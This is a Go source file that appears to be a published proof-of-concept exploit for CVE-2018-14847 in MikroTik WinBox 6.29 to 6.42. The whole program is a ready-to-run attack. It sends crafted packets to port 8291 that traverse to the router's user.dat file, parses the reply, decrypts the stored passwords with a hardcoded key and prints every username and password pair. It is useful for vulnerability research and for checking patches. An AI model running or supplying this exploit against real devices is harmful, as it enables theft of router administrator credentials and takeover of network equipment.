/*

# Title: Mikrotik WinBox 6.42 - Credential Disclosure ( golang edition )
# Author: Maxim Yefimenko ( @slider )
# Date: 2018-08-06
# Sotware Link: https://mikrotik.com/download
# Vendor Page: https://www.mikrotik.com/
# Version: 6.29 - 6.42
# Tested on: Fedora 28 \ Debian 9 \ Windows 10 \ Android ( wherever it was possible to compile.. it's golang ^_^ )
# CVE: CVE-2018-14847
# References:
# ( Alireza Mosajjal ) https://github.com/mosajjal https://n0p.me/winbox-bug-dissection/
# ( BasuCert ) https://github.com/BasuCert/WinboxPoC
# ( manio ) https://github.com/manio/mtpass/blob/master/mtpass.cpp
# and special thanks to Dmitriy_Area51

*/

package main

import (
	"crypto/md5"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

var (
	a = []byte{0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
		0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
		0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
		0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
		0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
		0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
		0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
		0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
		0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
		0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
		0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
		0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
		0x00, 0x00}

	b = []byte{0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
		0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
		0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
		0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
		0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
		0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
		0x00, 0x02, 0x00, 0x00, 0x00}

	buf = make([]byte, 1024*8)
)

func checkErr(err error) {
	if err != nil {
		fmt.Println("Error:" + err.Error())
	}
}

func decryptPassword(user []byte, passEnc []byte) string {
	var passw []byte
	hasher := md5.New()
	hasher.Write(user)
	hasher.Write([]byte("283i4jfkai3389"))
	key := hasher.Sum(nil)

	for i := 0; i < len(passEnc); i++ {
		passw = append(passw, passEnc[i]^key[i%len(key)])
	}

	return string(ASCIIonly(passw))
}

func ASCIIonly(s []byte) []byte {
	for i, c := range s {
		if c < 32 || c > 126 {
			return s[:i]
		}
	}
	return s
}

func extractPass(buff []byte) (s []string) {
	var (
		usr []byte
		pwd []byte
	)

	//searching for StartOfRecord
	for i := 0; i < len(buff); i++ {

		if i+2 >= len(buff) {
			break
		}

		if (buff[i] == 0x4d) && (buff[i+1] == 0x32) && (buff[i+2] == 0x0a || buff[i+2] == 0x10) {
			// fmt.Printf("Probably user record at offset 0x%.5x\n", i)

			//some bytes ahead is enable/disable flag
			i += int((buff[i+2] - 5))
			if i >= len(buff) {
				break
			}

			//searching for StartOfRecNumber
			if i+3 >= len(buff) {
				break
			}

			for !((buff[i] == 0x01) && ((buff[i+1] == 0x00) || (buff[i+1] == 0x20)) && (buff[i+3] == 0x09 || buff[i+3] == 0x20)) {
				i++
				if i+3 >= len(buff) {
					break
				}
			}

			i += 4
			if i >= len(buff) {
				break
			}
			// fmt.Printf("SORn: 0x%X\n", i)

			// comment?
			i += 18
			if (i + 4) >= len(buff) {
				break
			}
			if (!((buff[i+1] == 0x11) && (buff[i+2] == 0x20) && (buff[i+3] == 0x20) && (buff[i+4] == 0x21))) && (buff[i-5] == 0x03 && (buff[i] != 0x00)) {
				if (i+1)+int(buff[i]) >= len(buff) {
					break
				}
				i += int(buff[i])
			} else {
				i -= 18
			}

			//searching for StartOfPassword
			if i+4 >= len(buff) {
				break
			}

			for !((buff[i] == 0x11) && (buff[i+3] == 0x21) && ((buff[i+4] % byte(0x10)) == 0)) {
				i++
				if i+4 >= len(buff) {
					break
				}
			}
			i += 5
			if (i + 3) >= len(buff) {
				break
			}

			if (buff[i-1] != 0x00) && !((buff[i] == 0x01) && ((buff[i+1] == 0x20 && buff[i+2] == 0x20) || (buff[i+1] == 0x00 && buff[i+2] == 0x00)) && (buff[i+3] == 0x21)) {
				pwd = buf[i-1+1 : int(buf[i-1])+i-1+1]
				i += int(buff[i-1])
			}

			//searching for StartOfUsername
			if i+3 >= len(buff) {
				break
			}
			for !((buff[i] == 0x01) && (buff[i+3] == 0x21)) {
				i++
				if i+3 >= len(buff) {
					break
				}
			}

			i += 4
			if i >= len(buff) {
				break
			}
			if buff[i] != 0x00 {
				if i+int(buff[i]) >= len(buff) {
					break
				}

				usr = ASCIIonly(buff[i+1 : int(buff[i])+i+1])
				i += int(buff[i])
			}

			decrypted := decryptPassword(usr, pwd)
			//fmt.Printf(" --> %s\t%s\n", buff[i], decrypted)

			if len(usr) != 0 {
				s = append(s, strings.Join([]string{string(usr), string(decrypted)}, ":"))
			}

		}
	}

	return s
}

func main() {

	if len(os.Args) < 2 {
		fmt.Printf(" [ usage: %s 192.168.88.1\n\n", os.Args[0])
		os.Exit(0)
	}

	conn, err := net.DialTimeout("tcp", os.Args[1]+":8291", time.Duration(3*time.Second))

	if err != nil {
		fmt.Println(err.Error())
		return
	}

	defer conn.Close()

	conn.Write(a)
	reqLen, err := conn.Read(buf)
	checkErr(err)
	if reqLen < 38 {
		panic("First packet is too small")
	}

	b[19] = buf[38]

	conn.Write(b)
	reqLen, err = conn.Read(buf)
	checkErr(err)
	db := buf[:reqLen]

	s := extractPass(db)
	for i, acc := range s {
		data := strings.SplitN(acc, ":", 2)
		fmt.Printf(" [%d] %s\t%s\n", i, data[0], data[1])
	}
}